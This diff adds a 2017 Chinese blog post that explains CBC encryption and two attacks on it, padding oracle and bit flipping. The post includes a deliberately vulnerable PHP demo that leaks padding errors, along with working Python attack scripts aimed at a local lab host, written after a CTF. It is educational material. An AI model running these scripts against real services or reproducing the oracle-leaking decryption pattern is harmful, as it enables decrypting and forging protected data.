@@ -1,0 +1,236 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>WEB中的密码学攻击--CBC</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">k1n9's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+<!--         <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+   <!--      <li><a href="#">About Me</a></li> -->
+        <li><a href="/rss.xml">Rss</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">WEB中的密码学攻击--CBC</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2017-03-16</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">cbc, padding oracle attack, bit flipping attack</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>上学期密码程序设计的时候选的MD5就想到了解好了原理可以去写一篇关于其长度扩展攻击的博客，只是一直拖着没写。这几天打比赛的时候又碰到了跟密码学相关的题目了，密码学方面是真的弱，是时候记录一发了。</p>
+
+<h2 id="cbc的加密与解密">CBC的加密与解密</h2>
+<p>引用下维基对CBC的描述：</p>
+<blockquote>
+  <p>1976年，IBM发明了密码分组链接（CBC，Cipher-block chaining）。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p>
+</blockquote>
+
+<p>CBC属于分组密码工作模式，所以在加密或是解密之前都会有一个分组的过程。比如：AES-128-CBC，AES-192-CBC，AES-256-CBC则对应分组大小为16，24，32。因为明文不一定刚好够分，往往会出现最后一个分组中字节比分组设定的大小要小的情况，这时候就要进行填充，将最后一个分组填充到设定好的分组大小，这个填充过程到写Padding Oracle Attack再说。接下来做的就是每个分组的明文块分别加密后得到的密文块组合起来就是密文了。解密就是相对应的一个逆向过程。</p>
+
+<p>CBC加密过程：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c66c7a6df8b.png" alt="cbc_encode" />
+使用公式描述：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c66f4632842.jpg" alt="cbc_encode" />
+明文块与上一组密文块进行一次异或再被加密处理成对应的密文，第一组明文的话是与一个初始化向量（IV）进行异或。</p>
+
+<p>CBC解密过程：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c674cdf0c01.png" alt="cbc_decode" />
+使用公式描述：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6759ae738c.jpg" alt="cbc_decode" />
+就是对应加密的一个逆向过程了，了解好这两个过程对下面说的两个攻击是有很大的帮助的。这里并没有去关注它里面具体的加密/解密的实现哈，因为对要说的两种攻击没影响=。=
+这两个过程都会用到的变量：</p>
+<ul>
+  <li>IV	初始化向量</li>
+  <li>P		明文</li>
+  <li>C		密文</li>
+  <li>Key	进行具体加密过程需要用的一个变量</li>
+</ul>
+
+<h2 id="padding-oracle-attack">Padding Oracle Attack</h2>
+<p>这个攻击记得以前拿wvs去扫asp.net站点的时候会看到不少存在这个漏洞的提示，只不过那会不懂得，问了下群里，有人给我说就是攻击Oracle数据库的，哈哈。
+实际上这里的Oracle应该理解为“提示”，也就是根据服务器的“提示”（响应）进行相应填充的一个攻击。这个攻击能出现的原因是解密函数在对密文解密后会对填充信息进行校验，要是填充信息不对就会解密失败，解密失败是可能返回错误信息或者服务器直接500。
+能达到的一个攻击效果：<strong>在不知道Key的情况下获取明文</strong>。</p>
+
+<p>填充过程在这个攻击中是很重要的。这里只介绍PKCS#5这个常用的填充方式，也就是缺少n个字节就给它填充n个n，例如8个字节分组的：（下面大量盗图开始，下面参考里有连接）
+<img src="https://ooo.0o0.ooo/2017/03/13/58c69052c73b5.jpg" alt="64bit" />
+注意图中的Ex4这里要是刚好满足分组大小的话，会添加一个分组并用相应的n填充满。再来看看有填充的加密和解密过程：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6986d97d92.jpg" alt="encode" />
+<img src="https://ooo.0o0.ooo/2017/03/13/58c698e140d1a.jpg" alt="decode" />
+我们就是利用这个会对填充信息进行校验来进行攻击的，还有一点就是CBC是分组加密的，所以也是对应着对一组一组进行攻击。一个攻击过程：
+<img src="https://ooo.0o0.ooo/2017/03/13/58c69d7e8fdba.jpg" alt="attack_1" />
+这里传进去一个密文分组，和全是0的IV进行攻击，解密得到的最后一位为0x3D。填充信息的校验会失败，因为根据上面的填充方式知道，最后一组解密出来是必然带填充信息的，这里要是只有一位填充信息的话，那它肯定得是0x01。
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6a08f3cbf3.jpg" alt="attack_2" />
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6a090d951b.jpg" alt="attack_3" />
+接下来要做的就是不断增大IV（0x00-0xff），直到填充信息的校验成功。这样我们就可以用0x01和0x3C异或得到中间值的一位0x3D。这里的中间值是由具体解密过程得到的，只要与真实的IV进行异或就可以得到明文了，不清楚的话可以再去看看上面的CBC加解密过程。所以我们想得到明文只要拿到这个中间值就行了。这里还有一种情况就是如果中间值的后两位为0x00和0x02，那么我们传进去的初始向量的后两位为0x02和0x00时也能通过校验，所以一个更好的做法是校验成功时，再去修改IV的前一位看还是不是校验成功，成功的话这一位才是对的。
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6a55d0475b.jpg" alt="attack_4" />
+然后就是测试两位填充信息的情况。先要将IV的最后一位修改，值由0x3D和0x02异或得到。同样将IV的倒数第二位不断增大，直到校验成功得到中间值的倒数第二位。
+<img src="https://ooo.0o0.ooo/2017/03/13/58c6a55e57883.jpg" alt="attack_5" />
+重复上述过程就可以得到完整的中间值，和原来的IV进行异或得到第一个分组的明文。类推，可以得到所有的明文块。
+由攻击过程得知这种攻击的两个前提条件：</p>
+<ul>
+  <li>攻击者知道密文和IV</li>
+  <li>攻击者可以通过服务器的相应知道解密的成功与否</li>
+</ul>
+
+<h2 id="bit-flipping-attack">Bit Flipping Attack</h2>
+<p>比特翻转攻击，可以达到的一个攻击效果：<strong>修改密文解密后的明文</strong>。
+这个攻击的原理还是很好理解的。首先要知道C = A xor B的话，那么A，B，C这三者中的任意两个进行异或必然可以得到第三个的值。
+假设C为上面提到的中间值，A为初始向量，B为解密后的明文。现在想把明文A给替换成D，那么只要改变A = C xor B就行了，也就是A = A xor B xor D。类推，要是A为其它块密文的话，那么就可以改变下一个块的明文。要注意的一点就是你要是改变的是最后一块的明文长度，要记得把填充信息也进行异或处理。
+由攻击过程得知这种攻击的两个前提条件：</p>
+<ul>
+  <li>攻击者知道密文和IV</li>
+  <li>攻击者知道密文解密后的明文（这个可以由上面的那种攻击得到）</li>
+</ul>
+
+<h2 id="demo及攻击脚本">Demo及攻击脚本</h2>
+<p>写一个小demo：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nv">$type</span> <span class="o">=</span> <span class="s2">"aes-128-cbc"</span><span class="p">;</span>	<span class="c1">//加密类型，即分组大小为16</span>
+<span class="nv">$P</span> <span class="o">=</span> <span class="s2">"I_am_secret!"</span><span class="p">;</span>	<span class="c1">//明文</span>
+<span class="nv">$Key</span> <span class="o">=</span> <span class="s2">"aAbBcCdDeE"</span><span class="p">;</span>	<span class="c1">//加密要用到的Key</span>
+<span class="nv">$IV</span> <span class="o">=</span> <span class="s2">"aAbBcC2333333333"</span><span class="p">;</span>	<span class="c1">//初始化向量，因为有一个异或的过程，所以它的大小和分组大小要一样</span>
+
+<span class="nv">$C</span> <span class="o">=</span> <span class="nb">openssl_encrypt</span><span class="p">(</span><span class="nv">$P</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$Key</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nv">$IV</span><span class="p">);</span>
+<span class="c1">//满足padding oracle attack前提条件1</span>
+<span class="k">print</span> <span class="s2">"iv: "</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$IV</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="k">print</span> <span class="s2">"c: "</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$C</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>	<span class="c1">//可能存在不可显示的字符，加个base64的编码</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'s'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'iv'</span><span class="p">])){</span>
+	<span class="nv">$s</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'s'</span><span class="p">]);</span>
+	<span class="nv">$iv</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'iv'</span><span class="p">]);</span>
+	<span class="k">if</span><span class="p">((</span><span class="nv">$n</span> <span class="o">=</span> <span class="nb">openssl_decrypt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$Key</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">))</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>		<span class="c1">//解密失败会返回false</span>
+		<span class="c1">//bit flipping attack</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$n</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">){</span>
+			<span class="k">print</span> <span class="s2">"well done!"</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="c1">//满足padding oracle attack前提条件2</span>
+		<span class="k">die</span><span class="p">(</span><span class="s2">"Fail!"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Padding Oracle攻击脚本：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://hack.lo/cbc_po.php'</span>
+<span class="n">N</span> <span class="o">=</span> <span class="mi">16</span>
+<span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">N</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="s">'YUFiQmNDMjMzMzMzMzMzMw=='</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">)</span>
+<span class="n">tmp_iv</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">out</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">N</span>
+<span class="n">s</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+		<span class="n">l</span><span class="p">[</span><span class="n">N</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span>
+		<span class="n">tmp_iv</span> <span class="o">=</span> <span class="s">''</span>
+		<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+			<span class="n">tmp_iv</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+		<span class="k">print</span> <span class="n">tmp_iv</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+		<span class="n">payload</span> <span class="o">=</span> <span class="s">"?s=CQdsygAk3x07nzfUB5T3Qg</span><span class="si">%3</span><span class="s">D</span><span class="si">%3</span><span class="s">D&amp;iv="</span> <span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">tmp_iv</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'='</span><span class="p">,</span><span class="s">'</span><span class="si">%3</span><span class="s">d'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span><span class="s">'</span><span class="si">%2</span><span class="s">f'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'+'</span><span class="p">,</span><span class="s">'</span><span class="si">%2</span><span class="s">b'</span><span class="p">)</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+		<span class="k">if</span> <span class="s">'Fail!'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+			<span class="n">out</span><span class="p">[</span><span class="n">N</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span> <span class="o">^</span> <span class="n">i</span>
+			<span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+				<span class="n">l</span><span class="p">[</span><span class="n">N</span><span class="o">-</span><span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">N</span><span class="o">-</span><span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+			<span class="k">break</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
+	<span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
+	<span class="n">s</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">s</span>
+</code></pre></div></div>
+<p>Bit Flipping攻击脚本：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="s">"I_am_secret!"</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="s">"YUFiQmNDMjMzMzMzMzMzMw=="</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">))</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'d'</span><span class="p">))</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'m'</span><span class="p">))</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'i'</span><span class="p">))</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'n'</span><span class="p">))</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">8</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">8</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">9</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">9</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">10</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">10</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">11</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">11</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">4</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">4</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">4</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">4</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">15</span><span class="p">])</span> <span class="o">^</span> <span class="mi">11</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="后记">后记</h2>
+<p>比赛时写的脚本并没有对base64编码中的+，/，=进行url编码，导致只能跑出明文的一部分，代码写的烂啊，得好好写代码去。这个demo也是根据比赛时的题目弄得，但它那题目里的if判断中是没有和false进行判断的，明文的第一位会跑不出来，因为全填充16的时候它解密成功结果会是空，这样的话解密失败和解密成功就没区别了。</p>
+
+<h2 id="参考">参考</h2>
+<p>http://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</p>
+
+    </div>
+    
+    
+
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2015 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?cff98725226896ccfb3b1634435b315c";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
